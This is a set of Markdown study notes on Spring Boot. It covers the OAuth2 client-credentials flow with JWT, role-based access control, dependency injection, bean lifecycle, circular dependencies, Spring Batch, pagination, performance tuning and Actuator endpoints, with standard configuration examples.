# SpringBoot

- [Dependency Injection](#dependency-injection) 
- [HTTP Methods](#http-methods) 
- [ACID Properties](#acid-properties)
- [REST Features](#rest-features)
- [CRUD operations Validations](#crud-operations-validations)


### Service-to-Service Authentication using OAuth2 + JWT (Step-by-Step)

Order Service  →  Payment Service


There is no human user.
The calling service itself acts as the client/user.

#### Step 1️⃣ Service Registration (One-Time Setup)

Each service is registered with the Authorization Server as an OAuth2 client.
```
Example:

client_id     = order-service
client_secret = ********
allowed_scopes = payment.read, payment.write

```
👉 This represents the identity of the service.

####  Step 2️⃣ Service Requests Access Token (Login Step)

The calling service (Order Service) sends a request to the token endpoint using
OAuth2 Client Credentials Grant.(✅ The token endpoint is an endpoint exposed by the Authorization Server.)

POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials
&client_id=order-service
&client_secret=********
&scope=payment.write


📌 This step is the “login” for a service.

### Step 3️⃣ Authorization Server Validates Service

The Authorization Server:

Validates client_id and client_secret

Checks allowed scopes

Confirms service is trusted

If valid → proceeds.

#### Step 4️⃣ JWT Access Token Is Issued

Authorization Server returns a JWT:

{
  "access_token": "eyJhbGciOiJIUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 3600
}

JWT Contains Claims Like:
{
  "sub": "order-service",
  "scope": "payment.write",
  "iss": "auth-server",
  "exp": 1712345678
}


📌 No username
📌 No password
📌 Identity = service name

#### Step 5️⃣ Service Calls Another Service Using JWT

Order Service calls Payment Service:

POST /payments
Authorization: Bearer <JWT>

#### Step 6️⃣ Receiving Service Validates JWT

Payment Service:

Verifies JWT signature

Checks expiration (exp)

Validates scope/authority

Spring Security does this automatically when configured as a Resource Server.

#### Step 7️⃣ Authorization Decision

Based on JWT claims:

@PreAuthorize("hasAuthority('payment.write')")
@PostMapping("/payments")
public void makePayment() { }


✔ If scope exists → request allowed
❌ If not → 403 Forbidden

### 🔄 How it actually works (Client Credentials Flow)
Step-by-step

1️⃣ Order Service → Token Endpoint
    client_id + client_secret

2️⃣ Authorization Server
    → validates client
    → generates JWT access token

3️⃣ Order Service
    → stores token in memory/cache

4️⃣ Order Service → Trade Service
    Authorization: Bearer <JWT>

5️⃣ Trade Service
    → validates JWT (signature, expiry, scopes)




## 🔐 Step-by-Step: RBAC Configuration in Spring Boot

### ✅ STEP 1: Add Spring Security Dependency

```
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>
```

### ✅ STEP 2: Decide Where Roles Come From

In real projects, roles usually come from:

a) JWT token (most common)

b) Database

c) Identity Provider (Keycloak, Auth0, Okta)

📌 We’ll assume JWT contains roles.
      
Example JWT payload:
```
{
  "sub": "user123",
  "roles": ["ADMIN", "USER"]
}
```

✅ STEP 3: Configure Security Filter Chain


Create a Security Configuration class.

```
@Configuration
@EnableMethodSecurity   // enables @PreAuthorize
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {

        http
            .csrf(csrf -> csrf.disable())
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .requestMatchers("/user/**").hasAnyRole("USER", "ADMIN")
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth ->
                oauth.jwt()
            );

        return http.build();
    }
}
```
##### What you configured here:

✔ /admin/** → only ADMIN
✔ /user/** → USER or ADMIN
✔ JWT-based authentication

### ✅ STEP 4: Map Roles from JWT to Spring Security

Spring expects roles like:

ROLE_ADMIN
ROLE_USER

So we map JWT roles properly.
```
@Bean
public JwtAuthenticationConverter jwtAuthenticationConverter() {
    JwtGrantedAuthoritiesConverter converter =
        new JwtGrantedAuthoritiesConverter();

    converter.setAuthorityPrefix("ROLE_");
    converter.setAuthoritiesClaimName("roles");

    JwtAuthenticationConverter jwtConverter =
        new JwtAuthenticationConverter();
    jwtConverter.setJwtGrantedAuthoritiesConverter(converter);

    return jwtConverter;
}
```

Then plug it in:
```
.oauth2ResourceServer(oauth ->
    oauth.jwt(jwt ->
        jwt.jwtAuthenticationConverter(jwtAuthenticationConverter())
    )
)
```

### ✅ STEP 5: Secure APIs Using Roles (Method Level)

Now apply RBAC directly on APIs.
```
@RestController
@RequestMapping("/admin")
public class AdminController {

    @PreAuthorize("hasRole('ADMIN')")
    @GetMapping("/dashboard")
    public String adminDashboard() {
        return "Admin dashboard";
    }
}

```
```
@RestController
@RequestMapping("/user")
public class UserController {

    @PreAuthorize("hasAnyRole('USER','ADMIN')")
    @GetMapping("/profile")
    public String userProfile() {
        return "User profile";
    }
}
```

### ✅ STEP 6: application.yml Configuration
```
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: https://auth-server.com/realms/demo
```
👉 Tells Spring where to validate JWT.

### ✅ STEP 7: Test the Flow
Case 1: USER token

/user/profile → ✅ allowed

/admin/dashboard → ❌ 403 Forbidden

Case 2: ADMIN token

/user/profile → ✅ allowed

/admin/dashboard → ✅ allowed




## Q1- Why Do We Need @Bean When @Component Also Creates Beans? 🤔
Both `@Bean` and `@Component` create Spring-managed beans, but they are used in different scenarios.

| Feature           | @Bean                                                               | @Component                                                    |
|-------------------|---------------------------------------------------------------------|---------------------------------------------------------------|
| Usage             | Used inside `@Configuration` classes to manually create beans.      | Used to mark a class for automatic detection.                 |
| Control           | Full control over object creation and configuration.                | Spring creates the bean automatically.                        |
| External Classes? | Can be used for third-party classes (like REST clients, database connections). | Only works on classes you own and annotate.                   |
| Customization     | Allows modifying how the bean is created (e.g., constructor args, method calls). | Limited customization.                                        |

## Q2- How Does Spring Boot Find Beans?
a) Spring automatically scans packages and registers beans if they are annotated with:
- `@Component`
- `@Service`
- `@Repository`
- `@Controller`
- Explicit Bean Declaration (`@Bean`)

b) If a bean cannot be auto-detected (e.g., third-party classes), we register it manually using `@Bean`.

## Q3-Comparing Early vs Lazy Initialization
| Feature                     | Early Initialization (Default)                           | Lazy Initialization (`@Lazy`)                                  |
|-----------------------------|----------------------------------------------------------|---------------------------------------------------------------|
| When Bean is Created?       | At application startup                                   | Only when first used                                          |
| Memory Usage                | Higher (all beans preloaded)                             | Lower (only required beans loaded)                            |
| Startup Time                | Slower (loads all beans at once)                         | Faster (loads fewer beans at start)                           |
| Performance                 | Faster at runtime                                        | Might be slower on first use                                  |
| Use Case                    | Essential beans like Database Connections, Services      | Rarely used beans (e.g., large reports, email services)       |


## Bean Lifecycle
A Spring Bean goes through the following steps:
![image](https://github.com/user-attachments/assets/9630d2dc-b1dc-414b-889d-b6d24e744a2f)

Stage	Description
1. Instantiation	Spring creates a bean instance.
2. Populate Properties	Dependencies (via @Autowired, constructor, setters) are injected.
3. Bean Post-Processing (Before Initialization)	BeanPostProcessor#postProcessBeforeInitialization() runs.
4. Initialization	If the bean implements InitializingBean or has @PostConstruct, it is executed.
5. Bean Post-Processing (After Initialization)	BeanPostProcessor#postProcessAfterInitialization() runs.
6. Bean is Ready to Use	The bean is fully initialized and available for use.
7. Destruction	If the bean implements DisposableBean or has @PreDestroy, cleanup happens before destruction.
   
## Dependency Injection
Ans- Dependency Injection (DI) is a design pattern where Spring Boot automatically provides the required dependencies (objects) instead of you manually creating them.

## How Spring Manages Dependency Injection?
@Component tells Spring to create and manage the object.
@Autowired tells Spring to inject the required dependency automatically.
Spring removes tight coupling and makes code more flexible and testable.

## Q6- Types of Dependency Injection in Spring Boot

#### A)Constructor Injection (Recommended)
```
@Autowired
public Car(Engine engine) {  // Injects dependency via constructor
    this.engine = engine;
}
```

#### B) Setter Injection
```
@Autowired
public void setEngine(Engine engine) {
    this.engine = engine;
}
```

#### C) Field Injection (Not Recommended)
```
@Autowired
private Engine engine;
```

## Why Constructor Injection is Best?
✅ Makes objects immutable
✅ Works well with unit testing
✅ Ensures all required dependencies are available at the time of object creation

## 🔹 Summary
Spring Boot automatically injects objects using @Autowired
Removes manual object creation (new)
Supports different injection types (Constructor, Setter, Field)
Helps in managing dependencies, making the code flexible & testable

## Circular dependency and how do we break circular dependency?

Circular dependency occurs when beans depend on each other in a cycle.
The best way to break it is to redesign responsibilities, introduce interfaces or an orchestrator, or use event-driven communication. 
@Lazy should be a last resort.


## Handling Circular Dependencies (Spring / Java)

Circular dependencies often indicate a design problem — two classes depending on each other usually means responsibilities are mixed or misplaced. Below are practical strategies to resolve circular references, ranked by recommended usage.

---

## ✅ 1. Rethink the design (BEST solution)

Often a circular dependency means the responsibilities are wrong. Extract the common/shared behavior into a third component so services depend on that component rather than each other.

Bad:
```
OrderService ↔ PaymentService
```

Better:
```
OrderService → PaymentProcessor ← PaymentService
```

- Extract common logic into a third class (e.g., `PaymentProcessor`, `PaymentGateway`, or an `Adapter`).
- Benefits: clearer responsibilities, easier to test, no framework hacks required.

---

## ✅ 2. Use interfaces (Dependency Inversion)

Introduce an interface to invert the dependency so both sides depend on abstractions.

Example:
```java
public interface PaymentOperations {
    void pay(Order order);
}

@Service
public class PaymentService implements PaymentOperations {
    @Override
    public void pay(Order order) { /* ... */ }
}

@Service
public class OrderService {
    private final PaymentOperations paymentOperations;

    public OrderService(PaymentOperations paymentOperations) {
        this.paymentOperations = paymentOperations;
    }
}
```

- Reduces coupling
- Easier to substitute implementations and to mock/stub in tests
- Encourages clean separation of concerns

---

## ⚠️ 3. Use @Lazy (quick fix, not best design)

Spring's `@Lazy` can delay bean initialization to break circular references when a redesign is not feasible.

Example:
```java
@Service
public class OrderService {
    @Autowired
    @Lazy
    private PaymentService paymentService;
}
```

- What it does: delays creation of the injected bean until first use
- Use only as a last resort or temporary workaround
- Drawbacks: masks the underlying design problem and can make initialization order harder to reason about

---

## ⚠️ 4. Setter injection instead of constructor

Switching to setter (or field) injection can sometimes avoid circular constructor dependencies:

```java
@Service
public class OrderService {
    private PaymentService paymentService;

    @Autowired
    public void setPaymentService(PaymentService ps) {
        this.paymentService = ps;
    }
}
```

- Works because Spring can create the beans first and then satisfy setters
- Downsides: hides design issues, less safe than constructor injection (objects may be partially initialized), and harder to enforce required dependencies

---

## ✅ 5. Event-based communication (BEST for microservices)

In distributed systems or when decoupling is desired, use asynchronous events instead of direct calls.

Pattern:
- OrderService → publishes `OrderCreatedEvent`
- PaymentService → listens for `OrderCreatedEvent` and processes payment

Benefits:
- No direct dependency between services
- Highly scalable and resilient
- Enables eventual consistency and simpler service boundaries

Considerations:
- Adds operational complexity (messaging infrastructure)
- Requires handling eventual consistency and idempotency

---

## ✅ 6. Use Facade / Orchestrator pattern

Introduce an orchestrator or facade that coordinates interactions between services so they don't call each other directly.

```java
public class OrderPaymentOrchestrator {
    private final OrderService orderService;
    private final PaymentService paymentService;

    public OrderPaymentOrchestrator(OrderService orderService, PaymentService paymentService) {
        this.orderService = orderService;
        this.paymentService = paymentService;
    }

    public void createOrderAndPay(OrderRequest req) {
        Order order = orderService.createOrder(req);
        paymentService.pay(order);
        // coordinate other steps, transactions, compensations, etc.
    }
}
```

- Keeps services focused on a single responsibility
- Orchestrator coordinates the workflow without creating direct cyclic references between domain services

---

## Quick guidance: Which approach to choose?
- If the cycle indicates mixed responsibilities: Rethink the design and extract a third component (BEST).
- If you can introduce an abstraction: Use interfaces / dependency inversion.
- For cross-service decoupling in microservices: Use event-driven communication.
- For local coordination: Facade or Orchestrator.
- If you must unblock quickly: `@Lazy` or setter injection — but treat them as temporary workarounds.

---

## Summary
Prefer refactoring (extracting responsibilities or introducing abstractions) and decoupling (events or orchestrators). Use framework-specific fixes (`@Lazy`, setter injection) only when refactoring is impractical in the short term.

## Purpose and Use of API Key-Based Authorization in Spring Boot
API key-based authorization is a simple and effective way to secure REST APIs by requiring clients to include a valid API key in their requests. It ensures that only authorized users or applications can access certain endpoints.

## 📌 Purpose of API Key-Based Authorization
Authentication: Confirms the identity of the client making the request.
Access Control: Allows or denies access to specific endpoints based on the API key.
Security: Prevents unauthorized access, data breaches, and misuse of APIs.
Monitoring & Logging: Helps in tracking API usage and identifying suspicious activities.
Throttling & Rate Limiting: Restricts the number of requests from a particular API key to prevent abuse.


### To change the database in your Spring Boot project, follow these steps:


1. Update Dependencies in pom.xml (for Maven projects)
   
If you are switching from one database to another (e.g., from H2 to MySQL or PostgreSQL), update the dependencies accordingly.

Example for MySQL:

<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <scope>runtime</scope>
</dependency>

Example for PostgreSQL:

<dependency>
    <groupId>org.postgresql</groupId>
    <artifactId>postgresql</artifactId>
    <scope>runtime</scope>
</dependency>

2. Update application.properties or application.yml
   
Modify the database configuration in src/main/resources/application.properties (or application.yml).

Example for MySQL:
properties

spring.datasource.url=jdbc:mysql://localhost:3306/your_database
spring.datasource.username=root
spring.datasource.password=your_password
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
spring.jpa.database-platform=org.hibernate.dialect.MySQL8Dialect
Example for PostgreSQL:
properties

spring.datasource.url=jdbc:postgresql://localhost:5432/your_database
spring.datasource.username=postgres
spring.datasource.password=your_password
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect

3. Handle Database Schema Changes
   
If you are using Hibernate, update spring.jpa.hibernate.ddl-auto based on your needs:

create – Drops and recreates the database schema on each run.
update – Updates the schema without dropping existing tables.
validate – Only validates if the schema matches but doesn’t modify it.
none – Does nothing.
Example:

properties

spring.jpa.hibernate.ddl-auto=update
If using Flyway or Liquibase for migrations, update migration scripts accordingly.

4. Clear Cache and Restart
   
After making these changes:

Clean and build the project:

mvn clean package
Restart your Spring Boot application:
sh

mvn spring-boot:run

5. Check Database Connection
   
If using MySQL or PostgreSQL, you can test the connection using:

mysql -u root -p -h localhost -P 3306
or
sh

psql -U postgres -h localhost -p 5432

7. Update schema.sql and data.sql (Optional)
   
If you have hardcoded SQL scripts, update them to match the new database syntax.


### MVC (Model-View-Controller) in Spring Boot

Spring Boot follows the MVC (Model-View-Controller) design pattern to build web applications in a structured and maintainable way.

1. Components of MVC in Spring Boot
   
1️⃣ Model

Represents the application's data and business logic.
Usually implemented using POJOs (Plain Old Java Objects), JPA Entities, or DTOs.

2️⃣ View

Represents the UI (User Interface).
In Spring Boot, views can be created using:
Thymeleaf (default template engine)
JSP (Java Server Pages)
React/Angular (in a separate frontend)

3️⃣ Controller

Handles user requests and interacts with the model.
Uses @Controller or @RestController annotation.

## 2. How MVC Works in Spring Boot

User sends a request (e.g., /user).

Controller processes the request and interacts with the Model.

Model holds business data (e.g., fetches from a database).

View renders the response with model data (e.g., Thymeleaf).

## When to Use Spring MVC?

✅ Building web applications with UI (e.g., Thymeleaf)

✅ Creating REST APIs using Spring Boot

✅ Integrating with databases using Spring JPA

### Steps to Create a Custom Exception in Spring Boot

### a) Create a Custom Exception Class

 Extend RuntimeException (or Exception if checked exception is needed).
 
 Define constructors to accept error messages or causes.

 
### b)Create a Global Exception Handler

 Use @ControllerAdvice to handle exceptions globally.
 
 Define methods with @ExceptionHandler to return custom error responses.
 
### c)Throw the Custom Exception

Inside the service or controller, throw the custom exception when needed.

### d) Customize HTTP Response (Optional)

Use @ResponseStatus to set an HTTP status code.
Return a structured response using ResponseEntity<>.

### e) Test the Exception Handling

Use Postman or JUnit tests to verify that the exception is handled properly.


### ANNOTATION

1) @Component in Spring Boot is an annotation used to mark a class as a Spring-managed bean. In simple words, it tells Spring to automatically create an object (bean) of that class and manage its lifecycle.
2) @Autowired in Spring is used for automatic dependency injection. It tells Spring to automatically inject an instance of the required bean into a class, so you don’t have to create it manually.
3) @Service is a specialized version of @Component, meaning it tells Spring to create and manage an instance (bean) of the class.
When the application starts, Spring automatically detects classes annotated with @Service (thanks to Component Scanning) and registers them as beans.

4)@RestController → Used for REST APIs (returns JSON, plain text).
✅ @Controller → Used for MVC applications (returns HTML views).

5)@RequestBody in Spring Boot
The @RequestBody annotation is used in Spring Boot to map the HTTP request body to a Java object. It is mainly used in REST APIs to receive JSON or other data formats sent by the client.

### Why Use @ResponseBody?

When you want to return JSON or raw data instead of a webpage.

Used in REST APIs to send JSON responses.

Works well with @RestController, which applies it to all methods automatically.

### How It Works?

Without @ResponseBody:
Spring Boot assumes you want to return a webpage (view).

With @ResponseBody:
Spring Boot converts the response directly into JSON (or XML) and sends it back to the client.






### @PathVariable
It is an annotation in Spring Boot used to extract values from the URI (Uniform Resource Identifier) and pass them as method parameters in a REST controller. It is commonly used in RESTful APIs to handle dynamic path parameters.

### @RequestParam (Query Parameters) in Spring Boot

@RequestParam is used in Spring Boot to extract query parameters from the URL. Query parameters are typically used for filtering, sorting, pagination, or optional parameters in API requests.

@RequestParam String name extracts the name query parameter from the request.

If the query parameter is not present, Spring will throw an error since @RequestParam is required by default.

Using @RequestParam with Default Values
To avoid errors when a query parameter is missing, we can provide a default value.

```
@RestController
@RequestMapping("/employees")
public class EmployeeController {

    @GetMapping("/filter")
    public String filterEmployees(@RequestParam(defaultValue = "10") int limit) {
        return "Fetching " + limit + " employees";
    }
}
```

### When to Use @PathVariable?
Use @PathVariable when you need to extract mandatory values from the URL path to identify a resource.

✅ Best for:

Identifying a specific resource (id, username, etc.).
Creating RESTful endpoints that follow best practices.

### When to Use @RequestParam?
Use @RequestParam when you need to extract optional or filtering values from the query string.

✅ Best for:

Filtering, sorting, and pagination (page, size, sort).
Providing optional request parameters.


### Difference Between Spring and Spring Boot

| Feature                | Spring Framework                                         | Spring Boot                                                  |
|------------------------|---------------------------------------------------------|--------------------------------------------------------------|
| **Definition**         | A comprehensive framework for Java-based enterprise applications. | A subproject of Spring that simplifies application setup and development. |
| **Configuration**      | Requires manual configuration (XML or Java-based).      | Provides auto-configuration (less boilerplate code).        |
| **Standalone**         | Needs explicit setup of a web server like Tomcat, Jetty. | Comes with embedded servers like Tomcat, Jetty, Undertow.   |
| **Dependency Management** | Requires manual dependency management using Maven/Gradle. | Provides pre-configured dependencies via `spring-boot-starter` dependencies. |
| **Microservices Support** | Can be used for microservices but needs extra configurations. | Built-in support for microservices with Spring Cloud. |
| **Application Size**   | Requires writing a lot of boilerplate code.             | Less code, production-ready in minutes.                     |
| **Performance**        | Can be slower due to explicit configurations.           | Faster startup due to auto-configuration and optimized defaults. |
| **Deployment**         | Generates a WAR file that needs an external server.     | Generates a JAR file with an embedded server, so it runs independently. |
| **Spring MVC vs Spring Boot** | Spring MVC needs manual setup (dispatcher, templates, etc.). | Spring Boot auto-configures Spring MVC. |
| **Example of Starting a Web App** | Needs `web.xml`, dispatcher servlet, and additional configs. | Just use `@SpringBootApplication`, and it runs! |


### IOC

IoC in Spring improves modularity, testability, and maintainability by handling object creation and dependency injection automatically. Instead of hardcoding dependencies, Spring injects them dynamically, making applications more flexible and scalable.

### Spring MVC Architecture Diagram

Client (Browser)  →  DispatcherServlet  →  Controller  →  Service Layer  →  DAO (Database Access)
                                      ↓
                                   View Resolver
                                      ↓
                                     View (JSP, Thymeleaf)



### Spring MVC Flow (Step-by-Step)

### Client Request

A user sends a request (e.g., clicking a button or entering a URL).

### DispatcherServlet (Front Controller)

Intercepts the request and delegates it to the appropriate controller.

### Handler Mapping

Determines which controller should handle the request.
### Controller (Request Handling)

Processes the request, interacts with the service layer, and returns a response.
### Service Layer (Business Logic - Optional)

Handles business operations and communicates with the database.
### DAO (Data Access Object) - Optional

Retrieves or stores data in the database.
### Model (Data Transfer)

Stores data to be displayed in the view.
### View Resolver

Determines the correct view (JSP, Thymeleaf, etc.) to display the response.
### View (UI Layer)

Renders the response as HTML, JSON, or another format.
### Response Sent to Client

The final output is sent back to the browser.


## How I Used Spring Batch in My Project
I used Spring Batch to process client-provided files by implementing a multi-step batch pipeline. Here’s how I integrated it:

### 1. Job Definition
I defined a Spring Batch Job that processes files in multiple steps:

Step 1: Read the file and parse it into Java objects.
Step 2: Validate and transform the data.
Step 3: Store the processed data into a staging table using JPA.
Step 4: Trigger a Kafka event to notify downstream services.

### 2. File Processing with Spring Batch
I implemented chunk-based processing where data is read in batches rather than loading everything into memory at once.

```
@Configuration
@EnableBatchProcessing
public class FileProcessingBatchConfig {

    @Autowired
    private JobBuilderFactory jobBuilderFactory;

    @Autowired
    private StepBuilderFactory stepBuilderFactory;

    @Autowired
    private DataSource dataSource;

    @Bean
    public Job fileProcessingJob(Step fileProcessingStep) {
        return jobBuilderFactory.get("fileProcessingJob")
                .incrementer(new RunIdIncrementer())
                .start(fileProcessingStep)
                .build();
    }

    @Bean
    public Step fileProcessingStep(ItemReader<FileData> reader, 
                                   ItemProcessor<FileData, ProcessedData> processor,
                                   ItemWriter<ProcessedData> writer) {
        return stepBuilderFactory.get("fileProcessingStep")
                .<FileData, ProcessedData>chunk(100) // Process data in chunks of 100
                .reader(reader)
                .processor(processor)
                .writer(writer)
                .build();
    }
}
```
### 3. Implementing the Reader (ItemReader)
I used FlatFileItemReader to read CSV files and convert them into Java objects.

```
@Bean
public FlatFileItemReader<FileData> reader() {
    return new FlatFileItemReaderBuilder<FileData>()
            .name("fileReader")
            .resource(new FileSystemResource("input/data.csv"))
            .delimited()
            .names("id", "name", "email", "amount")
            .fieldSetMapper(new BeanWrapperFieldSetMapper<>() {{
                setTargetType(FileData.class);
            }})
            .build();
}
```

# 4. Implementing the Processor (ItemProcessor)
I performed data validation and transformation in the processor.


@Component
public class FileProcessor implements ItemProcessor<FileData, ProcessedData> {
    @Override
    public ProcessedData process(FileData item) {
        // Business logic: Data validation & transformation
        if (item.getAmount() < 0) {
            throw new ValidationException("Invalid amount");
        }
        return new ProcessedData(item.getId(), item.getName().toUpperCase(), item.getEmail(), item.getAmount());
    }
}

# 5. Implementing the Writer (ItemWriter)
I used JPA ItemWriter to store the data in the database.


@Bean
public JpaItemWriter<ProcessedData> writer(EntityManagerFactory entityManagerFactory) {
    JpaItemWriter<ProcessedData> writer = new JpaItemWriter<>();
    writer.setEntityManagerFactory(entityManagerFactory);
    return writer;
}
# 6. Integrating Kafka for Event Triggering
After processing the data, I published Kafka events to notify downstream services.

@Component
public class KafkaNotificationListener extends JobExecutionListenerSupport {
    @Autowired
    private KafkaTemplate<String, String> kafkaTemplate;

    @Override
    public void afterJob(JobExecution jobExecution) {
        if (jobExecution.getStatus() == BatchStatus.COMPLETED) {
            kafkaTemplate.send("processed-files-topic", "File processing completed successfully.");
        }
    }
}
### Benefits of Using Spring Batch in My Project
✅ Efficient Large File Processing – Used chunk-based processing to avoid memory overflow.
✅ Automatic Restart – Jobs could resume from the last successful step in case of failure.
✅ Scalability – Kafka integration ensured faster downstream processing.
✅ Security – Used Spring Security and OAuth2 for authentication.
✅ Database Optimization – Used indexing and batch inserts to optimize database performance.

### Pageable

Pageable is an interface in Spring Data that provides an abstraction for pagination and sorting when querying a database. It is mainly used with Spring Data JPA to retrieve paginated data efficiently.

To add pagination to an API response in Spring Boot, follow these steps:

### Use Pageable in Repository

To add pagination to an API response in a Spring Boot application, follow these steps:

# 1. Use Pageable in Repository Layer
Spring Data JPA provides built-in support for pagination using the Pageable interface.

```
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.data.jpa.repository.JpaRepository;

public interface ProductRepository extends JpaRepository<Product, Long> {
    Page<Product> findAll(Pageable pageable);
}
```
# 2. Modify the Service Layer
Use Pageable in the service layer to fetch paginated data.

```
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.stereotype.Service;

@Service
public class ProductService {
    
    private final ProductRepository productRepository;

    public ProductService(ProductRepository productRepository) {
        this.productRepository = productRepository;
    }

    public Page<Product> getAllProducts(Pageable pageable) {
        return productRepository.findAll(pageable);
    }
}
```
# 3. Update Controller to Accept Pagination Parameters
Expose an endpoint that supports pagination using Pageable.

```
import org.springframework.data.domain.Page;
import org.springframework.data.domain.Pageable;
import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping("/api/products")
public class ProductController {
    
    private final ProductService productService;

    public ProductController(ProductService productService) {
        this.productService = productService;
    }

    @GetMapping
    public Page<Product> getProducts(Pageable pageable) {
        return productService.getAllProducts(pageable);
    }
}
```
# 4. How to Use Pagination in API Calls
Spring Boot supports passing pagination parameters via query parameters:

```
GET /api/products?page=0&size=5&sort=name,asc
page=0 → First page (zero-based index)
size=5 → Number of records per page
sort=name,asc → Sort by name in ascending order
```
# 5. Customizing the Default Pageable Configuration
If you want to set default values for page size and sorting, use:

```
import org.springframework.data.domain.Sort;
import org.springframework.data.web.PageableDefault;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/api/products")
public class ProductController {
    
    private final ProductService productService;

    public ProductController(ProductService productService) {
        this.productService = productService;
    }

    @GetMapping
    public Page<Product> getProducts(
        @PageableDefault(size = 10, sort = "name", direction = Sort.Direction.ASC) Pageable pageable) {
        return productService.getAllProducts(pageable);
    }
}
```
# 6. Response Example
A paginated response will look like this:

```
{
    "content": [
        { "id": 1, "name": "Product A", "price": 100 },
        { "id": 2, "name": "Product B", "price": 200 }
    ],
    "pageable": {
        "pageNumber": 0,
        "pageSize": 5
    },
    "totalElements": 50,
    "totalPages": 10,
    "last": false,
    "first": true
}
```
# 7. Handling Pagination with Custom Response DTO
If you want to customize the response, use a DTO:

```
import java.util.List;

public class PaginatedResponse<T> {
    private List<T> content;
    private int pageNumber;
    private int pageSize;
    private long totalElements;
    private int totalPages;
    private boolean last;

    public PaginatedResponse(Page<T> page) {
        this.content = page.getContent();
        this.pageNumber = page.getNumber();
        this.pageSize = page.getSize();
        this.totalElements = page.getTotalElements();
        this.totalPages = page.getTotalPages();
        this.last = page.isLast();
    }

    // Getters & Setters
}
```
Modify the controller to return a PaginatedResponse:

```
@GetMapping
public PaginatedResponse<Product> getProducts(Pageable pageable) {
    Page<Product> productPage = productService.getAllProducts(pageable);
    return new PaginatedResponse<>(productPage);
}
```

##  Role-Based Access in Security Configuration (Global Access Control)

1) Spring Security allows role-based access at the request level using HttpSecurity.

2) Spring Security allows us to apply role-based access control at the method level using @PreAuthorize or @Secured.

Enable Method-Level Security
Add @EnableMethodSecurity in the security configuration:

```
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {
    // Security configuration goes here
}
```


### 🔍 What is Persistence in JPA / Spring Boot?

Persistence means saving an object’s state into a database so it can be retrieved and used later.

In Java (especially using JPA with Spring Boot), persistence refers to mapping Java objects to database tables and managing their life cycles—this is called Object-Relational Mapping (ORM).

### 🔧 Example:
```
@Entity
public class User {
    @Id
    private Long id;

    private String name;

    @Transient // <-- not persisted
    private String sessionToken;
}
```
Fields like id and name are persisted — i.e., stored in the database.

The sessionToken field is not persisted — JPA will ignore it while saving to or loading from the database.

# 🚀 Spring Boot Performance Optimization Guide

## 1. Optimize Database Access
- ✅ **Use indexing** on frequently queried columns.
- ✅ **Use pagination** (`Pageable`) for large result sets.
- ✅ Avoid **N+1 queries** — use `@EntityGraph` or fetch join in JPQL.
- ✅ **Use connection pooling** (HikariCP is default in Spring Boot 2+).
- ✅ **Use batch inserts/updates** (`hibernate.jdbc.batch_size`).

## 🧠 2. Use Caching Wisely
- ✅ Use **Spring Cache abstraction** (`@Cacheable`, `@CacheEvict`).
- ✅ Backend options: **Caffeine**, **EhCache**, **Redis**, etc.
- ✅ Cache **heavy/slow computations** or **frequent DB queries**.

## 🔄 3. Use Asynchronous Processing
- ✅ Use `@Async` to **offload non-critical tasks** (e.g., sending emails).
- ✅ Use **CompletableFuture**, **ExecutorService**, or Spring’s async support.

## 🔧 4. Tune JVM and GC
- ✅ Set appropriate **JVM heap size** (`-Xms`, `-Xmx`).
- ✅ Choose the right **Garbage Collector** (e.g., **G1GC** for balanced latency).
- ✅ Use tools like **JVisualVM**, **JFR**, or **YourKit** for profiling.

## 📦 5. Profile and Optimize Beans
- ✅ Reduce **autowiring of unused beans**.
- ✅ Use `@Lazy` initialization where necessary.
- ✅ Avoid **overuse of reflection** and **excessive logging**.

## 📉 6. Minimize Startup Time
- ✅ Use **Spring Boot 3’s improved GraalVM native support** if needed.
- ✅ Remove unnecessary dependencies.
- ✅ Enable lazy initialization:
  ```properties
  spring.main.lazy-initialization=true

##  🌐 7. Optimize REST APIs
- ✅ Use compression (GZIP/Deflate):
server.compression.enabled=true

- ✅ Use DTOs to avoid exposing entire entity trees.

- ✅ Reduce payload size using Jackson annotations (@JsonIgnore, etc.)

- ✅ Use HTTP/2 or WebFlux for reactive use cases.

## 🧵 8. Concurrency and Thread Pool Tuning
- ✅ Configure @Async thread pool (TaskExecutor).

- ✅ For web apps: Tune Tomcat thread pool:

```
server:
  tomcat:
    threads:
      max: 200
      min-spare: 20
```
##  📈 9. Use Metrics and Monitoring
- ✅ Integrate Micrometer + Prometheus + Grafana.

- ✅ Use Spring Boot Actuator for health and performance metrics.

##  📁 10. Use Efficient Data Formats
- ✅ Use Protobuf, Avro, or MessagePack for APIs where JSON is too verbose.

- ✅ Enable Jackson streaming API for large JSON processing.

## Spring Boot Actuator 

It is a powerful feature that helps you monitor and manage your Spring Boot application in production with minimal configuration. It exposes various endpoints over HTTP (or JMX), offering insight into your application's health, metrics, environment, and more.

## Spring Boot exposes several built-in endpoints, like:

/actuator/health	- App health status
/actuator/info -	Custom app info from properties
/actuator/metrics -	App metrics (JVM, CPU, memory, etc.)
/actuator/env	- Environment variables
/actuator/beans	- Beans in the app context
/actuator/mappings	- All URL mappings
/actuator/loggers -	Logger levels and configs
/actuator/threaddump	- JVM thread dump

###  What is the purpose of Spring Boot starters?

Spring Boot starters are a set of predefined dependencies provided by Spring Boot to help developers quickly set up and start working with common technologies and features without manually managing individual library versions.

| Starter Name                   | Use Case                                |
| ------------------------------ | --------------------------------------- |
| `spring-boot-starter-web`      | Build REST APIs and web apps            |
